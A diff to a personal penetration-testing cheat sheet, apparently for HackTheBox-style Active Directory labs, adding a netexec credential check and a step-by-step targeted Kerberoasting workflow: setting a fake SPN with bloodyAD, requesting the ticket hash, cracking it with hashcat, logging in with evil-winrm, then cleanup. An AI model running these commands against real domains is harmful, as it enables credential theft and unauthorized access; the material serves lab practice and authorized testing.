@@ -1146,6 +1146,10 @@ nxc ldap 172.16.8.3 -u hporter -p 'Gr8hambino!' --bloodhound --collection All
 #nxc using ligolo or proxychains
 nxc ldap 172.16.8.3 -u hporter -p 'Gr8hambino!' --bloodhound --collection All -d INLANEFREIGHT.LOCAL --dns-server 172.16.8.3
 
+#check user access against AD
+netexec smb 10.129.232.167 -u alfred -p 'password' -d tombwatcher.htb
+
+
 ```
 ##### LLMNR Poisoning
 ```
@@ -1339,6 +1343,7 @@ Get-ADGroupMember -Identity "Backup Operators"
 ```
 ##### Kerberoasting
 ```
+WINDOWS -----------------------------------------------------------------------------------------------------------------------------------------------------
 # Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
 impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
  
@@ -1381,6 +1386,50 @@ Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
 # Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
 .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+LINUX
+#Bloodhound shows WriteSPN
+
+Targeted Kerberoasting with BloodyAD requiered multiple steps, with targetedKerberoast.py is one command
+
+#targetedKerberoast.py
+targetedKerberoast.py -u henry -p 'pass' -d tombwatcher.htb --dc-ip 10.129.232.167 --request-user <target_user>
+
+
+#BloodyAD
+Step 1 — Set fake SPN on target (requires GenericWrite)
+bloodyAD -u mssqladm -p 'pass' \
+  -d INLANEFREIGHT.LOCAL \
+  --host 172.16.8.3 \
+  set object aduser servicePrincipalName \
+  -v 'fake/DEV01.INLANEFREIGHT.LOCAL'
+
+# Step 2 — Kerberoast the target user
+GetUserSPNs.py INLANEFREIGHT.LOCAL/mssqladm:'password' \
+  -dc-ip 172.16.8.3 \
+  -request-user aduser \
+  -outputfile aduser.hash
+
+# Step 3 — Crack offline
+hashcat -m 13100 aduser.hash /usr/share/wordlists/rockyou.txt --force
+
+# Step 4 — Use cleartext password
+evil-winrm -u aduser -p '<cracked_password>' -i 172.16.8.3
+
+Cleanup (Important for Reporting)
+bash# Remove fake SPN after Kerberoasting
+bloodyAD -u mssqladm -p 'password' \
+  -d INLANEFREIGHT.LOCAL \
+  --host 172.16.8.3 \
+  set object aduser servicePrincipalName \
+  -v ''
+
+# Verify SPN removed
+GetUserSPNs.py INLANEFREIGHT.LOCAL/mssqladm:'password' \
+  -dc-ip 172.16.8.3 | grep aduser
+# Should return nothing
+
 ```
 
 ##### ACL Enumeration and Tactics
